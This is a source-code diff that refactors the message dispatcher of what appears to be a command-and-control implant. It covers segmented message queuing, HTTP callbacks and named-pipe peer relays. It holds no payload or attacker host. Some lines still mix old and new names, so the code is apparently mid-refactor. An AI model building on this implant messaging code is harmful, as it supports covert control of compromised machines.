@@ -9,118 +9,76 @@ using namespace Network::Http;
 using namespace Memory::Execute;
 using namespace Dispatcher;
 
-// TODO: new design for send/receive buffers over SMB, similar to hyper-v
 namespace Dispatcher {
+    VOID AddMessage(PACKET *packet) {
+        auto head = Ctx->MessageCache;
 
-    VOID AddMessage(_stream *out) {
-        HEXANE;
-
-        auto head = ctx->transport.message_queue;
-
-        if (!ctx->transport.message_queue) {
-            ctx->transport.message_queue = out;
+        if (!Ctx->MessageCache) {
+            Ctx->MessageCache = packet;
         } else {
-            while (head->next) {
-                head = head->next;
+            while (head->Next) {
+                head = head->Next;
             }
 
-            head->next = out;
+            head->Next = packet;
         }
     }
 
-    VOID RemoveMessage(_stream *target) {
-        HEXANE;
+    VOID RemoveMessage(PACKET *target) {
+        PACKET *prev = { };
 
-        _stream *prev = { };
-
-        if (!ctx->transport.message_queue || !target) {
+        if (!Ctx->MessageCache || !target) {
             return;
         }
 
-        for (auto head = ctx->transport.message_queue; head; head = head->next) {
+        for (auto head = Ctx->MessageCache; head; head = head->Next) {
             if (head == target) {
                 if (prev) {
-                    prev->next = head->next;
+                    prev->Next = head->Next;
                 } else {
-                    ctx->transport.message_queue = head->next;
+                    Ctx->MessageCache = head->Next;
                 }
 
-                DestroyStream(head);
+                DestroyPacket(head);
                 return;
 
             }
-
             prev = head;
         }
     }
 
-    VOID MessageQueue(_stream *msg) {
-        HEXANE;
+	// NOTE: I feel like the architecture should just be "label inbound/outbound" then simply check all messages.
+	// Named pipes are FIFO anyway, so, why not just check? Unless they're blocking, which in that case, we wouldn't need flags.
+    VOID QueueSegments(UINT8* buffer, UINT32 length) {
+        PACKET *queue = { };
 
-        //_parser parser = { };
-        //_stream *queue = { };
+        UINT32 offset = 0;
+        UINT32 peerId = 0;
+        UINT32 taskId = 0;
+        UINT32 cbSeg  = 0;
+        UINT32 index  = 1;
 
-        msg->length > MESSAGE_MAX
-            ? QueueSegments(B_PTR(msg->buffer), msg->length)
-            : AddMessage(msg);
-
-        /*
-		  if (msg->length > MESSAGE_MAX) {
-		  QueueSegments(B_PTR(msg->buffer), msg->length);
-		  }
-		  else {
-		  AddMessage(msg);
-		  // TODO: the re-packaging of messages seems unecessary
-		  CreateParser(&parser, B_PTR(msg->buffer), msg->length);
-
-		  queue            = CreateStream();
-		  queue->peer_id   = __builtin_bswap32(UnpackUint32(&parser));
-		  queue->task_id   = __builtin_bswap32(UnpackUint32(&parser));
-		  queue->type      = __builtin_bswap32(UnpackUint32(&parser));
-
-		  queue->length    = parser.length;
-		  queue->buffer    = B_PTR(Realloc(queue->buffer, queue->length));
-
-		  MemCopy(queue->buffer, parser.buffer, queue->length);
-		  AddMessage(queue);
-
-		  DestroyParser(&parser);
-		  DestroyStream(msg);
-		*/
-	}
-
-    VOID QueueSegments(uint8_t *buffer, uint32_t length) {
-        HEXANE;
-
-        _stream *queue = { };
-
-        uint32_t offset     = 0;
-        uint32_t peer_id    = 0;
-        uint32_t task_id    = 0;
-        uint32_t cb_seg     = 0;
-        uint32_t index      = 1;
-
-        const auto n_seg        = (length + MESSAGE_MAX - 1) / MESSAGE_MAX;
-        constexpr auto m_max    = MESSAGE_MAX - SEGMENT_HEADER_SIZE;
+        const auto nSeg        = (length + MESSAGE_MAX - 1) / MESSAGE_MAX;
+        constexpr auto mMax    = MESSAGE_MAX - SEGMENT_HEADER_SIZE;
 
         while (length > 0) {
-            cb_seg  = length > m_max ? m_max : length;
-            queue   = (_stream*) Malloc(cb_seg + SEGMENT_HEADER_SIZE);
+            cbSeg = length > mMax ? mMax : length;
+            queue = (PACKET*) Ctx->Win32.RtlAllocateHeap(Ctx->Heap, 0, cbSeg + SEGMENT_HEADER_SIZE);
 
-            MemCopy(&peer_id, buffer, 4);
-            MemCopy(&task_id, buffer + 4, 4);
+            MemCopy(&peerId, buffer, sizeof(peerId));
+            MemCopy(&taskId, buffer + 4, sizeof(taskId));
 
-            queue->peer_id = peer_id;
-            queue->task_id = task_id;
-            queue->type    = TypeSegment;
+            queue->PeerId = peerId;
+            queue->TaskId = taskId;
+            queue->MsgType = TypeSegment;
 
             PackUint32(queue, index);
-            PackUint32(queue, n_seg);
-            PackUint32(queue, cb_seg);
-            PackBytes(queue, B_PTR(buffer) + offset, cb_seg);
+            PackUint32(queue, nSeg);
+            PackUint32(queue, cbSeg);
+            PackBytes(queue, (PBYTE)buffer + offset, cbSeg);
 
-            length -= cb_seg;
-            offset += cb_seg;
+            length -= cbSeg;
+            offset += cbSeg;
             index++;
 
             AddMessage(queue);
@@ -172,11 +130,9 @@ namespace Dispatcher {
     }
 
     BOOL DispatchRoutine() {
-        HEXANE;
-
-        bool success = true;
-        _stream *out = CreateStream();
-        _stream *in = { };
+        BOOL success = false;
+        PACKET *out = CreateStream();
+        PACKET *in = { };
 
     retry:
         if (!ctx->transport.message_queue) {
@@ -185,7 +141,7 @@ namespace Dispatcher {
                 goto retry;
             }
             else {
-                return success;
+                return true;
             }
         }
 
@@ -193,13 +149,11 @@ namespace Dispatcher {
 
         if (ROOT_NODE) {
             if (!HttpCallback(&in, out)) {
-                success = false;
                 goto defer;
             }
         }
         else {
             if (!PipeSend(out) || !PipeReceive(&in)) {
-                success = false;
                 goto defer;
             }
         }
@@ -207,15 +161,14 @@ namespace Dispatcher {
         PrepareIngress(in);
         PushPeers();
 
-    defer:
+		success = true;
+defer:
         DestroyStream(out);
         return success;
     }
 
     VOID CommandDispatch (_stream *in) {
-        HEXANE;
-
-        _parser parser = { };
+        PARSER parser = { };
 
         CreateParser(&parser, B_PTR(in->buffer), in->length);
         UnpackUint32(&parser);
